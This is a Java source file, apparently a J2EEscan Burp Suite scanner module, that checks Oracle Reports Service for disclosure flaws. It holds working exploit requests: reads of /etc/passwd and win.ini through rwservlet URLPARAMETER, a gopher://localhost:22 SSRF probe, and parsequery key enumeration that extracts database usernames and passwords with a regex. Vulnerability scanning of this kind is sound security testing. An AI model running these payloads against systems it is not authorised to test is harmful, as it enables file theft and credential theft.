package burp.j2ee.issues.impl;

import burp.CustomHttpRequestResponse;
import burp.HTTPMatcher;
import static burp.HTTPMatcher.getMatches;
import burp.IBurpExtenderCallbacks;
import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;
import burp.IRequestInfo;
import burp.IResponseInfo;
import burp.IScanIssue;
import burp.IScannerInsertionPoint;
import burp.j2ee.Confidence;
import burp.j2ee.CustomScanIssue;
import burp.j2ee.Risk;
import burp.j2ee.issues.IModule;

import java.io.PrintWriter;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class OracleReportService implements IModule {

    private static final String TITLE_INFO_DISCLOSURE = "Information Disclosure - Oracle Reports Service";
    private static final String DESCRIPTION_INFO_DISCLOSURE = "J2EEscan identified an information disclosure issue "
            + "in some Oracle Reports Services resources."
            + "<br /><br />"
            + "<b>References</b>:<br /><br />"
            + "http://blog.netinfiltration.com/2013/12/16/getting-a-remote-shell-on-oracle-forms-and-reports-11g/<br />"
            + "http://www.exploit-db.com/exploits/31253/<br />"
            + "http://docs.oracle.com/cd/E16764_01/bi.1111/b32121/pbr_cla002.htm<br />"
            + "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-3153<br />"
            + "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-3152<br />"
            + "http://dl.packetstormsecurity.net/0507-advisories/sa16092.txt";

    private static final String TITLE_LOCAL_FILE_DISCLOSURE = "Remote File Access - Oracle Reports Service";
    private static final String DESCRIPTION_LOCAL_FILE_DISCLOSURE = "J2EEscan was able to retrieve remote files from the server."
            + "<br /><br />"
            + "<b>References</b>:<br /><br />"
            + "http://www.exploit-db.com/exploits/31253/<br />"
            + "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-3152<br />";

    private static final String TITLE_SSRF = "SSRF - Oracle Reports Service";
    private static final String DESCRIPTION_SSRF = "J2EEscan was able to identify a SSRF - Server Side Request Forgery issue."
            + " A remote user through a specific request is able to create connection from the vulnerable server to intra/internet. "
            + "Using a protocol supported by available URI schemas, you can communicate with services running on other protocols"
            + "<br /><br />"
            + "<b>References</b>:<br /><br />"
            + "https://cwe.mitre.org/data/definitions/918.html<br />"
            + "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-3152<br />"
            + "SSRF Bible - https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/edit";

    
    private static final String TITLE_DATABASE_CREDENTIALS = "Information Disclosure - Oracle Reports Service - Database Credentials Retrieved";
    private static final String DESCRIPTION_DATABASE_CREDENTIALS = "J2EEscan was able to retrieve the Oracle database credentials."
            + " Abusing the Oracle Reports Servlet Parsequery Function, it was possible to retrieve the database password"
            + "<br /><br />"
            + "<b>References</b>:<br /><br />"
            + "http://www.oracle.com/technetwork/topics/security/cpuoct2012-1515893.html<br />";
    private static final String REMEDY = "Update the Oracle Report Services with the last security patches "
            + "and restrict access to those resources";

    // List of host and port system already tested
    private static LinkedHashSet hs = new LinkedHashSet();
    private static final List<String> ORACLE_REPORT_SERVICE_PATHS = Arrays.asList(
            "/reports/rwservlet/getserverinfo",
            "/reports/rwservlet/showenv",
            "/reports/rwservlet/showjobs",
            "/reports/rwservlet/showmap"
    );

    private PrintWriter stderr;
    private static final List<byte[]> GREP_STRINGS = Arrays.asList(
            "Successful Jobs".getBytes(),
            "Servlet Environment Variables".getBytes(),
            "Reports Server Queue Status".getBytes(),
            "Reports Servlet Key Map".getBytes()
    );

    private static final Pattern REPORT_SERVICE_KEY_PATTERN = Pattern.compile("OraInstructionText>([^<]+)<");
    private static final Pattern PWD_DISCLOSURE_PATTERN = Pattern.compile("userid=([^/]+)/([^@]+)@([^ \\t]+)([ \\t]|$)");
    private static final List<String> KEYMAPS_TO_IGNORE = Arrays.asList(
            "%ENV_NAME%",
            "barcodepaper",
            "barcodeweb",
            "breakbparam",
            "charthyperlink_ias",
            "charthyperlink_ids",
            "distributionpaper",
            "express",
            "orqa",
            "parmformjsp",
            "pdfenhancements",
            "report_defaultid",
            "report_secure",
            "run",
            "runp",
            "tutorial",
            "xmldata"
    );

    /**
     * Test Remote file disclosure and SSRF issues on servlet
     * "/reports/rwservlet"
     * 
     */
    private List<IScanIssue> testRwservletLFI(IBurpExtenderCallbacks callbacks,
            IHttpRequestResponse baseRequestResponse,
            IScannerInsertionPoint insertionPoint,
            URL url,
            PrintWriter stderr) {

        List<IScanIssue> issues = new ArrayList<>();

        String protocol = url.getProtocol();
        Boolean isSSL = (protocol.equals("https"));
        IExtensionHelpers helpers = callbacks.getHelpers();

        List<String> LFI_FILES = Arrays.asList("\"file:///etc/passwd\"",
                "\"file://c:/windows/win.ini\"",
                "\"file://c:/winnt/win.ini\"",
                "\"gopher://localhost:22/ss%0d%0a\""
        );

        String BASE_REQUEST = "/reports/rwservlet?report=test.pdf+desformat=html+destype=cache+JOBTYPE=rwurl+URLPARAMETER=%s";

        for (String LOCAL_FILE : LFI_FILES) {
            String RWSERVLET_ATTEMPT = String.format(BASE_REQUEST, LOCAL_FILE);

            try {
                URL urlToTest = new URL(protocol, url.getHost(), url.getPort(), RWSERVLET_ATTEMPT);
                byte[] oastest = helpers.buildHttpRequest(urlToTest);

                byte[] responseBytes = callbacks.makeHttpRequest(url.getHost(),
                        url.getPort(), isSSL, oastest);

                // look for matches of our active check grep string in the response body
                IResponseInfo statusInfo = helpers.analyzeResponse(responseBytes);
                if (statusInfo.getStatusCode() == 200) {

                    // Local file include check
                    if (HTTPMatcher.isWinINI(responseBytes, helpers) || HTTPMatcher.isEtcPasswdFile(responseBytes, helpers)) {
                        issues.add(new CustomScanIssue(
                                baseRequestResponse.getHttpService(),
                                helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                new CustomHttpRequestResponse(oastest, responseBytes, baseRequestResponse.getHttpService()),
                                TITLE_LOCAL_FILE_DISCLOSURE,
                                DESCRIPTION_LOCAL_FILE_DISCLOSURE,
                                REMEDY,
                                Risk.High,
                                Confidence.Certain
                        ));
                    }

                    // Example of SSRF attack on SSH service in localhost.
                    // Response
                    // SSH-2.0-OpenSSH_5.3 
                    // Protocol mismatch.
                    // A connection to an unused port
                    // A timeout occurred in accessing the URL gopher://localhost:23/ss
                    if ((RWSERVLET_ATTEMPT.contains("gopher"))) {

                        List<int[]> matchesSSHFound = getMatches(responseBytes, "SSH".getBytes(), helpers);
                        List<int[]> matchesServiceNotFound = getMatches(responseBytes, "A timeout occurred in accessing the URL gopher".getBytes(), helpers);
                        if ((matchesSSHFound.size() > 0) || (matchesServiceNotFound.size() > 0)) {

                            issues.add(new CustomScanIssue(
                                    baseRequestResponse.getHttpService(),
                                    helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                    new CustomHttpRequestResponse(oastest, responseBytes, baseRequestResponse.getHttpService()),
                                    TITLE_SSRF,
                                    DESCRIPTION_SSRF,
                                    REMEDY,
                                    Risk.High,
                                    Confidence.Certain
                            ));

                        }
                    }
                }

            } catch (MalformedURLException ex) {
                stderr.println("Malformed URL Exception " + ex);
            }

        }

        return issues;
    }

    /**
     * Test remote database credential disclosure
     * http://www.oracle.com/technetwork/topics/security/cpuoct2012-1515893.html
     * 
     */
    private List<IScanIssue> testOracleReportsServicePwdDisclosure(IBurpExtenderCallbacks callbacks,
            IHttpRequestResponse baseRequestResponse,
            IScannerInsertionPoint insertionPoint,
            URL url,
            PrintWriter stderr,
            byte[] showMapPage) {

        List<IScanIssue> issues = new ArrayList<>();

        String protocol = url.getProtocol();
        Boolean isSSL = (protocol.equals("https"));
        IExtensionHelpers helpers = callbacks.getHelpers();

        String RWSERVLET_PARSEQUERY_URL = "/reports/rwservlet/parsequery?";

        String[] lines = helpers.bytesToString(showMapPage).split("\n");
        int i = 0;
        String key = null;

        for (String line : lines) {
            if (!line.contains("OraInstructionText")) {
                continue;
            }
            i++;
            if (i % 2 == 0) {
                continue;
            }

            Matcher matcher = REPORT_SERVICE_KEY_PATTERN.matcher(line);

            if (matcher.find()) {
                key = matcher.group(1);
                if (!KEYMAPS_TO_IGNORE.contains(key)) {

                    try {

                        URL urlToTest = new URL(protocol, url.getHost(), url.getPort(), RWSERVLET_PARSEQUERY_URL + key);

                        byte[] oastest = helpers.buildHttpRequest(urlToTest);

                        byte[] responseBytes = callbacks.makeHttpRequest(url.getHost(),
                                url.getPort(), isSSL, oastest);

                        /**
                         * Example of response
                         *
                         * <FONT SIZE=+1>Original Query String(GET) :</FONT>\n"
                         * +
                        * "
                         * <P>
                         * <LI><FONT SIZE=+1>Result Reports Server Command
                         * Line</FONT>\n" + "<BR>expiredays=0
                         * pfaction=http://HOST/reports/rwservlet?_hidden_XYZ
                         * jobname=\"NoName\" = pfformat=html paramform=yes
                         * userid=USER/PWD@DB_NAME authid=RWUser/
                         */
                        if (responseBytes != null) {

                            Matcher credential_matcher = PWD_DISCLOSURE_PATTERN.matcher(helpers.bytesToString(responseBytes));
                            if (credential_matcher.find()) {
                                String user = credential_matcher.group(1);                                
                                String pwd = credential_matcher.group(2);
                                String db = credential_matcher.group(3);
                                
                               String vuln_detail = String.format("<br /><br /><b>USER:</b> %s<br />"
                                       + "<b>PASSWORD:</b> %s<br />"
                                       + "<b>DATABASE:</b> %s<br />", user, pwd, db);
                                               
                               issues.add(new CustomScanIssue(
                                        baseRequestResponse.getHttpService(),
                                        helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                        new CustomHttpRequestResponse(oastest, responseBytes, baseRequestResponse.getHttpService()),
                                        TITLE_DATABASE_CREDENTIALS,
                                        DESCRIPTION_INFO_DISCLOSURE + vuln_detail,
                                        REMEDY,
                                        Risk.High,
                                        Confidence.Certain
                                ));
                               
                            }
                        }

                    } catch (MalformedURLException ex) {
                        stderr.println("Malformed URL Exception " + ex);
                    }

                }
            }

        }

        return issues;
    }

    @Override
    public List<IScanIssue> scan(IBurpExtenderCallbacks callbacks, IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {

        List<IScanIssue> issues = new ArrayList<>();

        byte[] showMapHTMLPage = null;

        IExtensionHelpers helpers = callbacks.getHelpers();
        stderr = new PrintWriter(callbacks.getStderr(), true);

        IRequestInfo reqInfo = helpers.analyzeRequest(baseRequestResponse);

        URL url = reqInfo.getUrl();
        String host = url.getHost();
        int port = url.getPort();

        String system = host.concat(Integer.toString(port));

        // System not yet tested for this vulnerability
        if (!hs.contains(system)) {

            hs.add(system);

            String protocol = url.getProtocol();
            Boolean isSSL = (protocol.equals("https"));

            for (String ORACLE_REPORT_SERVICE_PATH : ORACLE_REPORT_SERVICE_PATHS) {

                try {

                    URL urlToTest = new URL(protocol, url.getHost(), url.getPort(), ORACLE_REPORT_SERVICE_PATH);
                    byte[] oastest = helpers.buildHttpRequest(urlToTest);

                    byte[] responseBytes = callbacks.makeHttpRequest(url.getHost(),
                            url.getPort(), isSSL, oastest);

                    // look for matches of our active check grep string in the response body
                    IResponseInfo statusInfo = helpers.analyzeResponse(responseBytes);

                    if (statusInfo.getStatusCode() == 200) {

                        for (byte[] GREP_STRING : GREP_STRINGS) {
                            List<int[]> matches_j2ee = getMatches(responseBytes, GREP_STRING, helpers);
                            if (matches_j2ee.size() > 0) {

                                issues.add(new CustomScanIssue(
                                        baseRequestResponse.getHttpService(),
                                        helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                        new CustomHttpRequestResponse(oastest, responseBytes, baseRequestResponse.getHttpService()),
                                        TITLE_INFO_DISCLOSURE + " - " + ORACLE_REPORT_SERVICE_PATH,
                                        DESCRIPTION_INFO_DISCLOSURE + "<br /><br /><b>Path: " + ORACLE_REPORT_SERVICE_PATH + "</b><br />",
                                        REMEDY,
                                        Risk.Medium,
                                        Confidence.Certain
                                ));

                                // Temporary save showmap page
                                if (ORACLE_REPORT_SERVICE_PATH.equalsIgnoreCase("/reports/rwservlet/showmap")) {
                                    showMapHTMLPage = responseBytes;
                                }

                            }
                        }
                    }

                } catch (MalformedURLException ex) {
                    stderr.println("Malformed URL Exception " + ex);
                }
            }

            // One or more Oracle Reports Service resource has been found
            if (!issues.isEmpty()) {

                // Test for CVE-2012-3152
                issues.addAll(testRwservletLFI(callbacks, baseRequestResponse, insertionPoint, url, stderr));

                // Test for Credential disclosure on rwservlet/parsequery
                if (showMapHTMLPage != null) {
                    issues.addAll(testOracleReportsServicePwdDisclosure(callbacks, baseRequestResponse, insertionPoint, url, stderr, showMapHTMLPage));
                }
            }

        }

        return issues;
    }

}
